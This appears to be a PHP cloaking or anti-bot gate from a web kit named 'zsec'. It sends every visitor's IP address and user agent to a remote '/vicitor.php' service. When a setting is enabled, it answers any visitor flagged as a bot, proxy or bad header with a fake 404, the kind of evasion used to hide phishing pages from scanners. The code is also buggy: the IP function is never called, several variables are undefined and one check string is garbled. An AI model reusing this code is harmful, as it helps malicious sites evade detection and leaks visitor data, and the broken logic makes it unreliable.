<?php
error_reporting(0);
session_start();

//includes
include "zsec-config.php";

function psec_get_realip()
{
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if (getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if (getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if (getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if (getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if (getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    return $ipaddress;
}

if(empty($ipaddress)){
    $ip = $_SERVER['REMOTE_ADDR'];
}else{
    $ip = $ipaddress;
}

if(isset($_SERVER['HTTP_USER_AGENT'])){
        $useragent = $_SERVER['HTTP_USER_AGENT'];
}
$url = $zsec_site.'/vicitor.php';
$fields = array(
    'as' => $useragent,
    'ip' => $ip
);

//url-ify the data for the POST
foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
rtrim($fields_string, '&');

//open connection
$ch = curl_init();

//set the url, number of POST vars, POST data
curl_setopt($ch,CURLOPT_URL, $url);
curl_setopt($ch,CURLOPT_POST, count($fields));
curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

//execute post
$result = curl_exec($ch);

//close connection
curl_close($ch);

    if($zsec_p == "on"){
        $hip = $ip;
        $kks = rand(0000000000,9999999999);
        // $reqsturi = $_SERVER['REQUEST_URI'];
        $chs = curl_init($zsec_site.'/vicitor.php?key='.$keyy."&api=".$api."&ip=".$hip);
        curl_setopt($chs, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($chs, CURLOPT_POSTFIELDS,  $post_fields);
        curl_setopt($chs, CURLOPT_POST, 1);
        $resuult = curl_exec($chs);
        if(strpos($resuult, "ban good") !== false ){
            if(strpos($resuult, "bad bot good") !== false ){
                if(strpos($resuult, "fake bot good") !== false ){
                    if(strpos($resuult, "headers good") !== false ){
                            if(strpos($resuult, "proxy good") !== false ){
                                if(strpos($resuult, "2roxy goo") !== false ){
                                    //all okay
                                    echo '';
                                }else{
                                    exit(header("HTTP/1.0 404 Not Found"));
                                    }
                            }else{
                            exit(header("HTTP/1.0 404 Not Found"));
                                }
                        }else{
                            exit(header("HTTP/1.0 404 Not Found"));
                     }
                    }else{
                        exit(header("HTTP/1.0 404 Not Found"));
                    }
                }else{
                    exit(header("HTTP/1.0 404 Not Found"));
                }
            }else{
                exit(header("HTTP/1.0 404 Not Found"));
            }
    }

?>